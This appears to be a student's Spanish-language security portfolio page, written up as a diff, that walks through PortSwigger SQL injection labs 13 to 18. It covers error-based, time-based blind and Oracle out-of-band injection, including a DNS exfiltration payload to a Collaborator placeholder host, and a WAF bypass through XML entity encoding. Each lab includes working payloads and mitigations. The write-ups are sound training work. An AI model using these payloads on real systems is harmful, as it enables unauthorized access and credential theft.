+    <article class="lab-card" id="lab-13">
+    <header class="lab-header">
+        <span class="badge practitioner" style="background: #f2994a;">Nivel: Intermedio (Practitioner)</span>
+        <h2>13. Visible error-based SQL injection</h2>
+    </header>
+
+    <div class="highlight-box">
+        <p><strong>Tipo de SQLi:</strong> Inyección SQL Basada en Errores Visibles (Visible Error-based / In-band SQLi)</p>
+        <p><strong>Objetivo:</strong> Comprometer la cuenta del usuario administrator forzando a la base de datos a revelar sus credenciales en texto plano a través de los mensajes de error devueltos en la respuesta HTTP.</p>
+        <p><strong>Vulnerabilidad:</strong> La aplicación carece de un manejo seguro de excepciones (Custom Error Pages). El servidor refleja el error crudo (verbose error) en el frontend, lo que permite inyectar funciones de conversión de tipos de datos incompatibles (Type Casting) para que el motor SQL imprima el dato confidencial directamente en el texto del error.</p>
+    </div>
+
+    <div class="lab-content">
+        <h3><i class="fas fa-terminal"></i> Procedimiento</h3>
+        <p>Entramos al laboratorio navegando por el sitio sin ningún cambio visible. Capturamos una request para editar su Cookie y agregamos una comilla simple (<code>'</code>) al final del código.</p>
+        
+        <p><strong>Resultado:</strong> La página retornó un texto de error SQL crítico que reveló la estructura exacta de la consulta subyacente y confirmó que la inyección ocurría dentro de una cadena delimitada por comillas simples.</p>
+
+        
+
+        <div class="step-detail">
+            <h4>Paso 1: Confirmación de Control</h4>
+            <p>Comentamos la consulta agregando <code>--</code> al final de la comilla para descartar entradas posteriores. La página cargó sin problemas, indicando que el error previo era de sintaxis y confirmando nuestro control sobre las consultas.</p>
+        </div>
+
+        <div class="step-detail">
+            <h4>Paso 2: Pruebas de Type Casting</h4>
+            <p>Adaptamos el payload a una consulta genérica con <code>SELECT</code>, casteando el valor a <code>INT</code> para forzar un error de conversión:</p>
+            <div class="code-block">TrackingId=C7O7mZ66ZdK9gsws' AND CAST((SELECT 1) AS int)--</div>
+            <p>El resultado fue un error en el argumento <code>AND</code>, indicando que debe ser booleano. Ajustamos la consulta a una comparación:</p>
+            <div class="code-block">TrackingId=C7O7mZ66ZdK9gsws' AND 1=CAST((SELECT 1) AS int)--</div>
+            <p>Esto nos regresó a la página principal (TRUE), pero no nos dio retroalimentación de datos.</p>
+        </div>
+
+        <div class="step-detail">
+            <h4>Paso 3: Optimización del Espacio en la Cookie</h4>
+            <p>Intentamos consultar la tabla de usuarios:</p>
+            <div class="code-block">TrackingId=C7O7mZ66ZdK9gsws ' AND 1=CAST((SELECT username FROM users) AS int)--</div>
+            <p>El error indicó que la respuesta estaba <strong>truncada</strong> debido a un límite de caracteres en la cookie. Como el código de sesión no es necesario para la inyección, lo eliminamos para ganar espacio:</p>
+            <div class="code-block">TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--</div>
+            <p>Añadimos <code>LIMIT 1</code> ya que <code>CAST</code> solo opera sobre un valor único. El motor SQL intentó convertir el nombre de usuario a entero, falló y escupió el nombre del usuario en el reporte de error.</p>
+        </div>
+
+        <div class="step-detail">
+            <h4>Paso 4: Extracción de Credenciales y Resolución</h4>
+            <p>Con el administrador identificado como el primer registro, diseñamos la consulta para extraer la contraseña:</p>
+            <div class="code-block">TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--</div>
+            <p>El servidor arrojó un nuevo error de sintaxis que contenía la contraseña en texto plano: <strong>i3rpmtbwp1xi74smj59z</strong>. Procedimos a validar las credenciales en el login de forma exitosa.</p>
+        </div>
+
+        <div class="evidencia-container" style="text-align: center; margin: 30px 0;">
+            <h4>Evidencia del Error Verbose: Contraseña Extraída</h4>
+            <img src="img/evidencias/lab13_visible_error.png" alt="Verbose SQL error message revealing administrator password" style="max-width: 100%; border-radius: 8px; border: 1px solid #ddd;">
+        </div>
+
+        <section class="mitigacion-section">
+            <h3><i class="fas fa-shield-alt"></i> Mitigación recomendada</h3>
+            <div class="mitigacion-card">
+                <ul>
+                    <li><strong>Páginas de Error Personalizadas:</strong> Configurar la aplicación para mostrar mensajes genéricos y nunca el error crudo del motor de base de datos.</li>
+                    <li><strong>Consultas Parametrizadas:</strong> Utilizar Prepared Statements para evitar la concatenación de entradas en la cookie.</li>
+                    <li><strong>Mínimo Privilegio:</strong> Asegurar que la cuenta de conexión de la DB no tenga permisos excesivos que faciliten la enumeración de tablas sensibles.</li>
+                </ul>
+            </div>
+        </section>
+    </div>
+</article>
+    <article class="lab-card" id="lab-14">
+    <header class="lab-header">
+        <span class="badge practitioner" style="background: #f2994a;">Nivel: PRACTITIONER</span>
+        <h2>14. Blind SQL injection with time delays</h2>
+    </header>
+
+    <div class="highlight-box">
+        <p><strong>Tipo de SQLi:</strong> Blind SQL Injection basada en tiempo (Time‑based)</p>
+        <p><strong>Objetivo:</strong> Explotar una vulnerabilidad de SQL Injection para forzar un retraso de 10 segundos en la respuesta del servidor, demostrando que la consulta SQL se ejecuta de forma síncrona.</p>
+        <p><strong>Vulnerabilidad:</strong> La aplicación utiliza una cookie de seguimiento (tracking cookie) para análisis. El valor de esta cookie se inserta directamente en una consulta SQL sin validación, permitiendo inyectar condiciones que generen retrasos temporales.</p>
+    </div>
+
+    <div class="lab-content">
+        <h3><i class="fas fa-terminal"></i> Procedimiento</h3>
+        
+        <div class="step-detail">
+            <h4>Paso 1 y 2: Preparación del Entorno</h4>
+            <p>Se ingresa a la plataforma de Web Security Academy y se accede al entorno del laboratorio, copiando la URL proporcionada para las pruebas.</p>
+        </div>
+
+        
+
+        <div class="step-detail">
+            <h4>Paso 4 y 5: Intercepción y Análisis</h4>
+            <p>Se pega el enlace en el navegador de Burp Suite para capturar las peticiones HTTP en el proxy. Se analiza el historial de tráfico para identificar la petición que contiene la cookie de seguimiento <code>TrackingId</code>.</p>
+        </div>
+
+        <div class="step-detail">
+            <h4>Paso 6 y 7: Configuración en Repeater</h4>
+            <p>Se envía la petición al módulo <strong>Repeater</strong> para manipularla de forma manual. Se consulta la documentación de ayuda del laboratorio en la sección "Time delays" para estructurar el payload adecuado según el motor de base de datos correspondiente.</p>
+        </div>
+
+        <div class="step-detail">
+            <h4>Paso 8: Inyección del Payload</h4>
+            <p>Se modifica la cookie <code>TrackingId</code> agregando una comilla simple (<code>'</code>) después del valor numérico. Se inyecta el comando de retraso concatenando con el signo <code>+</code> (en lugar de espacios) y se finaliza con doble guion (<code>--</code>) para comentar el resto de la consulta original.</p>
+            <div class="code-block">TrackingId=x'+AND+(SELECT+pg_sleep(10))--</div>
+        </div>
+
+        <div class="step-detail">
+            <h4>Paso 9: Verificación y Resolución</h4>
+            <p>Al enviar la petición modificada, observamos en el Repeater un retraso de respuesta de <strong>10 segundos exactos</strong>. El servidor procesa la instrucción de suspensión antes de devolver la respuesta HTTP.</p>
+            <p>Al enviarlo, efectivamente hace el retraso de 10 segundos, dándonos el laboratorio como resuelto y mostrando el mensaje: <strong>“Congratulations, you solved the lab!”</strong>.</p>
+        </div>
+
+        <div class="evidencia-container" style="text-align: center; margin: 30px 0;">
+            <h4>Evidencia de Respuesta Síncrona (Time Delay)</h4>
+            <img src="img/evidencias/lab_blind_time.png" alt="Burp Suite Repeater showing response time of 10,000+ milliseconds" style="max-width: 100%; border-radius: 8px; border: 1px solid #ddd;">
+        </div>
+
+        <section class="mitigacion-section">
+            <h3><i class="fas fa-shield-alt"></i> Mitigación recomendada</h3>
+            <div class="mitigacion-card">
+                <ul>
+                    <li><strong>Consultas Parametrizadas:</strong> Utilizar Prepared Statements para que el motor de la base de datos no interprete comandos de control (como <code>pg_sleep</code> o <code>dbms_pipe.receive_message</code>) inyectados en las cookies.</li>
+                    <li><strong>Validación de Cookies:</strong> Implementar filtros que rechacen caracteres especiales como comillas y paréntesis en campos que solo deben contener identificadores alfanuméricos.</li>
+                    <li><strong>Timeouts de Consulta:</strong> Configurar tiempos de espera máximos en la ejecución de consultas para mitigar ataques de denegación de servicio (DoS) por acumulación de procesos en espera.</li>
+                </ul>
+            </div>
+        </section>
+    </div>
+</article>
+<article class="lab-card" id="lab-15">
+    <header class="lab-header">
+        <span class="badge practitioner" style="background: #f2994a;">Nivel: PRACTITIONER</span>
+        <h2>15. Blind SQL injection with time delays and information retrieval</h2>
+    </header>
+
+    <div class="highlight-box">
+        <p><strong>Tipo de SQLi:</strong> Blind SQL Injection basada en tiempo (Time-based) y recuperación de información.</p>
+        <p><strong>Objetivo:</strong> Explotar una vulnerabilidad de inyección SQL basada en tiempo para inferir, carácter por carácter, la contraseña del usuario administrator y lograr el acceso a la plataforma.</p>
+        <p><strong>Vulnerabilidad:</strong> La aplicación utiliza una cookie de seguimiento (TrackingId) que se inserta de forma insegura en una consulta SQL síncrona. Como la base de datos es PostgreSQL, podemos inyectar la función <code>pg_sleep()</code> para forzar retrasos de tiempo condicionales. Al medir cuánto tarda en responder el servidor, podemos deducir si una condición inyectada es verdadera o falsa.</p>
+    </div>
+
+    <div class="lab-content">
+        <h3><i class="fas fa-terminal"></i> Procedimiento</h3>
+
+        
+
+        <div class="step-detail">
+            <h4>Pasos 1 a 5: Preparación e Intercepción</h4>
+            <p>Se inicia el laboratorio y se abre Burp Suite para capturar la navegación. Identificamos la petición HTTP que contiene la cookie <code>TrackingId</code>, que será nuestro punto de inyección, y la enviamos al <strong>Repeater</strong>.</p>
+        </div>
+
+        <div class="step-detail">
+            <h4>Pasos 6 y 7: Validación de la Inyección Condicional</h4>
+            <p>Aplicamos el primer payload de prueba:</p>
+            <div class="code-block">'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--</div>
+            <p>El servidor tarda 10 segundos en responder, confirmando que la condición es verdadera. Para validar, enviamos:</p>
+            <div class="code-block">'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--</div>
+            <p>Como 1 no es igual a 2, la aplicación responde inmediatamente sin demora.</p>
+        </div>
+
+        <div class="step-detail">
+            <h4>Pasos 8 a 10: Determinación de la Longitud</h4>
+            <p>Enviamos la petición al <strong>Intruder</strong> para un ataque enfocado en la longitud de la contraseña. Configuramos un contador numérico (1 al 26) usando <code>LENGTH(password)>§1§</code>. Notamos que a partir de la longitud 20 el tiempo de respuesta cambia, confirmando que la contraseña tiene exactamente <strong>20 caracteres</strong>.</p>
+        </div>
+
+        <div class="step-detail">
+            <h4>Pasos 11 a 15: Ataque Cluster Bomb y Extracción</h4>
+            <p>Preparamos el payload de extracción de datos en el Repeater:</p>
+            <div class="code-block">'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</div>
+            <p>En el Intruder, seleccionamos el tipo de ataque <strong>Cluster Bomb</strong> con dos payloads:</p>
+            <ul>
+                <li><strong>Payload 1:</strong> Contador para la posición (1 al 20).</li>
+                <li><strong>Payload 2:</strong> Fuerza bruta probando cada posible carácter (a-z, 0-9).</li>
+            </ul>
+            <p><strong>Configuración Crítica:</strong> En la pestaña "Resource pool", configuramos <code>Maximum concurrent requests: 1</code> para evitar que múltiples peticiones síncronas generen falsos positivos en el tiempo de respuesta.</p>
+        </div>
+
+        <div class="step-detail">
+            <h4>Pasos 16 a 18: Recopilación y Acceso</h4>
+            <p>Al concluir, ordenamos los resultados por la columna <strong>"Response received"</strong> (tiempo de respuesta). Las peticiones con retrasos superiores a 5000ms nos revelaron los caracteres en su posición respectiva.</p>
+            <p><strong>Contraseña obtenida:</strong> <code>tmmowcfokak4zmj52ky0</code></p>
+            <p>Ingresamos a "My account" con el usuario administrator y la contraseña extraída, logrando el acceso exitoso y concluyendo el laboratorio.</p>
+        </div>
+
+        <div class="evidencia-container" style="text-align: center; margin: 30px 0;">
+            <h4>Evidencia de Extracción: Caracteres identificados por retraso</h4>
+            <img src="img/evidencias/lab_blind_time_retrieval.png" alt="Burp Suite Intruder results sorted by response time for time-based SQLi" style="max-width: 100%; border-radius: 8px; border: 1px solid #ddd;">
+        </div>
+
+        <section class="mitigacion-section">
+            <h3><i class="fas fa-shield-alt"></i> Mitigación recomendada</h3>
+            <div class="mitigacion-card">
+                <ul>
+                    <li><strong>Consultas Parametrizadas:</strong> Es la única forma definitiva de evitar que comandos como <code>pg_sleep</code> o <code>SUBSTRING</code> sean ejecutados desde una entrada de usuario.</li>
+                    <li><strong>Reducción de Privilegios:</strong> La cuenta de la base de datos no debe tener permisos para ejecutar funciones de temporización o acceder a tablas de usuarios si no es estrictamente necesario.</li>
+                    <li><strong>Detección de Anomalías:</strong> Implementar sistemas que detecten ráfagas de solicitudes con tiempos de respuesta inusualmente altos o patrones de fuerza bruta.</li>
+                </ul>
+            </div>
+        </section>
+    </div>
+</article>
+    <article class="lab-card" id="lab-16">
+    <header class="lab-header">
+        <span class="badge practitioner" style="background: #f2994a;">Nivel: Intermedio (Practitioner)</span>
+        <h2>16. Blind SQL injection with out-of-band interaction</h2>
+    </header>
+
+    <div class="highlight-box">
+        <p><strong>Tipo de SQLi:</strong> Inyección SQL fuera de banda (Out-of-band SQLi / OAST).</p>
+        <p><strong>Objetivo:</strong> Explotar una vulnerabilidad de inyección SQL en una cookie de seguimiento, causando una búsqueda DNS en Burp Collaborator.</p>
+        <p><strong>Vulnerabilidad:</strong> Cookie de Rastreo; puede modificarse por una carga útil que mezcla la inyección SQL con una técnica XXE (XML External Entity) para activar una interacción con el servidor Burp Collaborator. Esta técnica aprovecha configuraciones débiles en los analizadores XML para forzar peticiones a redes externas.</p>
+    </div>
+
+    <div class="lab-content">
+        <div class="alert-box" style="background: #fff3cd; border-left: 5px solid #ffecb5; padding: 15px; margin-bottom: 20px;">
+            <p><i class="fas fa-exclamation-triangle"></i> <strong>Nota:</strong> Para esta práctica es necesario utilizar la versión **Professional** de Burp Suite para acceder al cliente de Collaborator.</p>
+        </div>
+
+        <h3><i class="fas fa-terminal"></i> Procedimiento</h3>
+        
+        <p>Se envían todas las solicitudes HTTP que realiza el navegador. Posteriormente, se manda al <strong>Repeater</strong> la solicitud HTTP de la página de inicio. En las cookies se encuentra el <code>tracking_id</code>, la vulnerabilidad que tenemos a la mano para poder explotar el sitio.</p>
+
+        
+
+        <div class="step-detail">
+            <h4>Paso 1: Generar el Burp Collaborator Client</h4>
+            <p>Se genera un “Burp Collaborator Client”, la herramienta principal para este laboratorio. Este genera un subdominio específico que permite detectar vulnerabilidades que no devuelven una respuesta directa en el sitio web (invisibles al atacante de forma directa).</p>
+            <p>Con esta herramienta, el subdominio se sondea para confirmar que la búsqueda DNS se haya realizado con éxito tras la inyección.</p>
+        </div>
+
+        <div class="step-detail">
+            <h4>Paso 2: Selección del Payload (Oracle XXE)</h4>
+            <p>Siguiendo la pista de la actividad en la sección de "Búsqueda DNS", seleccionamos el payload para bases de datos <strong>Oracle</strong>. El XXE que nos interesa utiliza funciones de red de la base de datos para forzar la interacción externa.</p>
+            <p>Esta carga útil se mezcla con la consulta de la cookie incluyendo el subdominio generado. La función del payload no es “tomar información” en este paso, sino actuar como un <strong>radar</strong>, forzando a la base de datos a llamar a nuestro servidor.</p>
+        </div>
+
+        <div class="step-detail">
+            <h4>Paso 3: Construcción de la Inyección</h4>
+            <p>Se le agrega una comilla simple (<code>'</code>) para cerrar la cadena de texto original de la cookie de seguimiento en la consulta SQL subyacente:</p>
+            <div class="code-block">SELECT tracking_id FROM analytics WHERE tracking_id = 'cadena_de_la_cookie'</div>
+            <p>Al colocar la comilla al principio del payload, cerramos el valor y preparamos la consulta para inyectar el código malicioso. Utilizamos el operador <code>||</code> (u otro método de concatenación según el contexto) para unir la consulta original con la inyectada.</p>
+            <div class="code-block">'||(SELECT+extractvalue(xmltype('&lt;?xml+version="1.0"+encoding="UTF-8"?&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+"http://BURP-COLLABORATOR-SUBDOMAIN"&gt;+%25remote%3B]&gt;'),'/l')+FROM+dual)--</div>
+        </div>
+
+        <div class="step-detail">
+            <h4>Paso 4: Verificación y Resolución</h4>
+            <p>Al enviar la petición en el Repeater, sondeamos las interacciones en el cliente de Collaborator. Por el nombre del dominio y la IP en los registros de entrada (DNS/HTTP), corroboramos que se logró realizar la búsqueda con éxito.</p>
+            <p>Esto muestra que la base de datos ejecutó nuestra instrucción y salió a internet para resolver el dominio, confirmando que el laboratorio ha sido completado.</p>
+        </div>
+
+        <div class="evidencia-container" style="text-align: center; margin: 30px 0;">
+            <h4>Evidencia de Interacción en Burp Collaborator</h4>
+            <img src="img/evidencias/lab_oob_interaction.png" alt="Burp Collaborator tab showing DNS and HTTP interactions" style="max-width: 100%; border-radius: 8px; border: 1px solid #ddd;">
+        </div>
+
+        <section class="mitigacion-section">
+            <h3><i class="fas fa-shield-alt"></i> Mitigación recomendada</h3>
+            <div class="mitigacion-card">
+                <ul>
+                    <li><strong>Deshabilitar funciones de red:</strong> Restringir la capacidad de la base de datos para realizar peticiones externas (DNS, HTTP, SMB) mediante permisos a nivel de sistema operativo y base de datos.</li>
+                    <li><strong>Parchear analizadores XML:</strong> Mantener actualizadas las bibliotecas de procesamiento XML para mitigar ataques XXE que son utilizados como vector en estas inyecciones.</li>
+                    <li><strong>Consultas Parametrizadas:</strong> Como en toda SQLi, evitar que datos del usuario (cookies) se concatenen en la lógica de la consulta.</li>
+                </ul>
+            </div>
+        </section>
+    </div>
+</article>
+    <article class="lab-card" id="lab-17">
+    <header class="lab-header">
+        <span class="badge practitioner" style="background: #f2994a;">Nivel: Intermedio (Practitioner)</span>
+        <h2>17. Blind SQL injection with out-of-band data exfiltration</h2>
+    </header>
+
+    <div class="highlight-box">
+        <p><strong>Tipo de SQLi:</strong> Inyección SQL fuera de banda (Out-of-band SQLi / OAST).</p>
+        <p><strong>Objetivo:</strong> Explotar una vulnerabilidad de inyección SQL en una cookie de seguimiento, ahora con exfiltración de información, obteniendo las claves de acceso del administrador.</p>
+        <p><strong>Vulnerabilidad:</strong> Similar al laboratorio anterior, se aprovecha una vulnerabilidad en la cookie de rastreo para forzar una interacción externa. Sin embargo, en este caso la carga útil se diseña para que el servidor de la base de datos incluya datos sensibles (como la contraseña) como parte del subdominio consultado en la búsqueda DNS.</p>
+    </div>
+
+    <div class="lab-content">
+        <h3><i class="fas fa-terminal"></i> Procedimiento</h3>
+        
+        <p>Al agregar el sitio web al proxy y tomar la solicitud del sitio principal, obtenemos el resultado en el <strong>Repeater</strong> confirmando que el sitio funciona correctamente.</p>
+
+        
+
+        <div class="step-detail">
+            <h4>Paso 1: Configuración de Burp Collaborator</h4>
+            <p>Creamos un nuevo subdominio único utilizando el cliente de <strong>Burp Collaborator</strong>. Este actuará como nuestro receptor de información fuera de banda.</p>
+        </div>
+
+        <div class="step-detail">
+            <h4>Paso 2: Selección del Payload de Exfiltración</h4>
+            <p>Consultando el acordeón de SQLi de Portswigger, seleccionamos la carga útil para <strong>Oracle</strong>. A diferencia de la práctica anterior, que sólo hacía un "ping" para confirmar la vulnerabilidad, este payload nos permite realizar consultas para extraer información de la BD.</p>
+            <p>La estructura del payload utiliza funciones de red para resolver un nombre de dominio que nosotros construimos dinámicamente.</p>
+        </div>
+
+        <div class="step-detail">
+            <h4>Paso 3: Construcción de la Consulta de Extracción</h4>
+            <p>Lo que buscamos es obtener la contraseña del usuario administrador. Realizamos la inyección de SQL en la cookie utilizando los caracteres <code>+||+</code>, que funcionan como la sintaxis de concatenación de cadenas en Oracle.</p>
+            <div class="code-block">'||(SELECT+extractvalue(xmltype('&lt;?xml+version="1.0"+encoding="UTF-8"?&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+"http://"||(SELECT+password+FROM+users+WHERE+username='administrator')||".BURP-COLLABORATOR-SUBDOMAIN"&gt;+%25remote%3B]&gt;'),'/l')+FROM+dual)--</div>
+            <p>Nótese cómo la consulta <code>SELECT password FROM users</code> se concatena directamente antes del subdominio de Collaborator.</p>
+        </div>
+
+        <div class="step-detail">
+            <h4>Paso 4: Recepción de Datos y Resolución</h4>
+            <p>Al enviar la petición y sondear nuestro subdominio en el cliente de Collaborator, obtenemos la clave del administrador concatenada como un prefijo en la consulta DNS recibida.</p>
+            <p><strong>Resultado:</strong> Identificamos la contraseña en los logs de Collaborator. Intentamos entrar con la contraseña obtenida y el usuario <strong>administrator</strong>, lo cual nos permite el acceso exitoso, terminando el laboratorio con éxito.</p>
+        </div>
+
+        <div class="evidencia-container" style="text-align: center; margin: 30px 0;">
+            <h4>Evidencia de Exfiltración en Logs DNS</h4>
+            <img src="img/evidencias/lab_oob_exfiltration.png" alt="Burp Collaborator showing DNS lookup with password as subdomain" style="max-width: 100%; border-radius: 8px; border: 1px solid #ddd;">
+        </div>
+
+        <section class="mitigacion-section">
+            <h3><i class="fas fa-shield-alt"></i> Mitigación recomendada</h3>
+            <div class="mitigacion-card">
+                <ul>
+                    <li><strong>Prevención de Exfiltración DNS:</strong> Configurar el firewall y los servidores DNS internos para que solo permitan resoluciones de dominios autorizados (listas blancas), bloqueando peticiones hacia dominios desconocidos provenientes de los servidores de bases de datos.</li>
+                    <li><strong>Consultas Parametrizadas:</strong> Implementar <code>Prepared Statements</code> para neutralizar la capacidad del atacante de inyectar lógica de concatenación en las cookies.</li>
+                    <li><strong>Hardening de Oracle:</strong> Deshabilitar o restringir el acceso a paquetes como <code>UTL_HTTP</code>, <code>UTL_INADDR</code> o la funcionalidad de <code>XMLTYPE</code> que permite interacciones externas.</li>
+                </ul>
+            </div>
+        </section>
+    </div>
+</article>
+    <article class="lab-card" id="lab-18">
+    <header class="lab-header">
+        <span class="badge practitioner" style="background: #f2994a;">Nivel: PRACTITIONER</span>
+        <h2>18. SQL injection with filter bypass via XML encoding</h2>
+    </header>
+
+    <div class="highlight-box">
+        <p><strong>Tipo de SQLi:</strong> SQL Injection basada en UNION con bypass de filtros mediante codificación XML.</p>
+        <p><strong>Objetivo:</strong> Explotar la vulnerabilidad de inyección SQL en la función de verificación de stock para obtener datos de otras tablas, específicamente recuperar el usuario y contraseña del administrador, y posteriormente iniciar sesión.</p>
+        <p><strong>Vulnerabilidad:</strong> La aplicación web presenta una vulnerabilidad en la función que consulta el stock de productos. Los datos enviados en formato XML se insertan directamente en una consulta SQL. Aunque existe un filtro (WAF) que bloquea caracteres sospechosos, este puede ser evadido utilizando codificación de entidades XML, lo que permite inyectar consultas de forma indirecta.</p>
+    </div>
+
+    <div class="lab-content">
+        <h3><i class="fas fa-terminal"></i> Procedimiento</h3>
+        <ol>
+            <li>Abrimos <strong>Burp Suite Community Edition</strong>. Damos click en siguiente y Start up.</li>
+            <li>Nos vamos a Proxy y <strong>Open Browser</strong>.</li>
+            <li>Pegamos la URL del laboratorio en la nueva ventana.</li>
+            <li>Realizamos una petición de "Check stock", hacemos click derecho y <strong>Send to Repeater</strong>.</li>
+        </ol>
+
+        
+
+        <div class="step-detail">
+            <h4>Análisis y Prueba de Filtro</h4>
+            <p>Observamos que los datos se envían en una estructura XML: <code>&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</code>.</p>
+            <p>Si intentamos inyectar un payload simple como <code>1 UNION SELECT NULL</code> en el <code>storeId</code>, el servidor responde con un <strong>403 Forbidden</strong> y el mensaje "Attack detected".</p>
+        </div>
+
+        <div class="step-detail">
+            <h4>Bypass mediante codificación (Hackvertor)</h4>
+            <p>Para evadir el filtro, instalamos la extensión <strong>Hackvertor</strong> en Burp Suite. Seleccionamos nuestro payload y aplicamos la codificación <code>hex_entities</code>. Esto convierte el texto claro en entidades hexadecimales que el filtro no reconoce como maliciosas.</p>
+            <p><strong>Determinación de columnas:</strong> Probamos con el payload codificado. El servidor responde con un <strong>200 OK</strong>, confirmando que la inyección es procesada correctamente tras ser decodificada por el parser XML interno.</p>
+        </div>
+
+        <div class="step-detail">
+            <h4>Extracción de credenciales</h4>
+            <p>Según el cheat sheet de PortSwigger, para concatenar valores en una sola columna en PostgreSQL/MySQL usamos el operador <code>||</code>. El payload final inyectado en <code>storeId</code> (y luego codificado) es:</p>
+            <div class="code-block">1 UNION SELECT username || '~' || password FROM users</div>
+        </div>
+
+        <div class="step-detail">
+            <h4>Resolución</h4>
+            <p>Obtenemos la respuesta con el texto <strong>administrator~[PASSWORD]</strong>. Copiamos la contraseña y procedemos a iniciar sesión en la sección "My account", lo cual marca el laboratorio como resuelto.</p>
+        </div>
+
+        <div class="evidencia-container" style="text-align: center; margin: 30px 0;">
+            <h4>Evidencia: Bypass Exitoso con Hackvertor</h4>
+            <img src="img/evidencias/lab_xml_bypass.png" alt="Burp Suite Repeater showing hex_entities encoding bypassing the WAF" style="max-width: 100%; border-radius: 8px; border: 1px solid #ddd;">
+        </div>
+
+        <div class="highlight-box" style="background: #f8f9fa; border-left: 5px solid #272822;">
+            <h3>Explicación del payload</h3>
+            <p>El payload utilizado es: <code>1 UNION SELECT username || '~' || password FROM users</code>.</p>
+            <ul>
+                <li><strong>1:</strong> Valor esperado para que la consulta original sea válida.</li>
+                <li><strong>UNION SELECT:</strong> Comando para combinar los resultados originales con nuestra consulta.</li>
+                <li><strong>username || '~' || password:</strong> Concatena el usuario y la clave en una sola cadena. Es necesario porque la aplicación solo devuelve una columna de resultados.</li>
+                <li><strong>FROM users:</strong> Especifica la tabla objetivo.</li>
+                <li><strong>Codificación XML (Entidades Hex):</strong> El payload se convierte a un formato tipo <code>&amp;#x53;&amp;#x45;...</code>. Esto engaña al WAF (que busca la palabra "SELECT" en plano), pero el servidor de base de datos recibe el texto ya decodificado por el parser XML y lo ejecuta.</li>
+            </ul>
+        </div>
+
+        <section class="mitigacion-section">
+            <h3><i class="fas fa-shield-alt"></i> Mitigación recomendada</h3>
+            <div class="mitigacion-card">
+                <ol>
+                    <li><strong>Consultas Parametrizadas:</strong> El motor de la base de datos debe tratar los datos del XML como literales y no como código SQL.</li>
+                    <li><strong>Saneamiento XML:</strong> Configurar el analizador XML para validar que el contenido de etiquetas como <code>&lt;storeId&gt;</code> sea estrictamente numérico.</li>
+                    <li><strong>Seguridad del WAF:</strong> Mejorar las reglas del Firewall para que realice una decodificación de entidades antes de inspeccionar el tráfico.</li>
+                    <li><strong>Principio de Menor Privilegio:</strong> Asegurar que el usuario de la DB no tenga permisos para acceder a la tabla <code>users</code> innecesariamente.</li>
+                </ol>
+            </div>
+        </section>
+    </div>
+</article>
+    </main>
+
+    <footer>
+        <p>Seguridad Informática | Universidad Politécnica de San Luis Potosí</p>
+        <p style="font-size: 0.7em; opacity: 0.5; margin-top: 10px;">&copy; 2026 Portafolio de Ciberseguridad - Actividad 04</p>
+    </footer>
+
+    <script src="../assets/js/jquery.min.js"></script>
+    <script src="../assets/js/escenarios.js"></script>
+    <script src="../assets/js/animaciones.js"></script>
+</body>
+</html>S
